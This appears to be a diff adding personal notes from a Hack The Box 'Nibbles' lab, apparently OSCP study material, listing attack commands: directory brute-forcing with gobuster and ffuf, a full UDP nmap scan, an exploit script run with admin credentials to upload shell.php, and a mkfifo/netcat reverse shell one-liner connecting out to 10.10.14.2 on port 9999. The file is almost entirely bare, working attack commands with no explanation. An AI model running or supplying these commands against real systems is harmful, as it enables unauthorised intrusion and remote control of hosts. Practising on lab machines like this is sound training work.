@@ -1,0 +1,10 @@
+
+gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -t 80
+
+ffuf -u https://nibbles.htb/nibbleblog/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c -e .txt,.php,.html
+
+nmap -sU -O -p- -oN /opt/OSCP/labs/HTB/75-Nibbles/udp 10.10.10.75
+
+python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9999 >/tmp/f
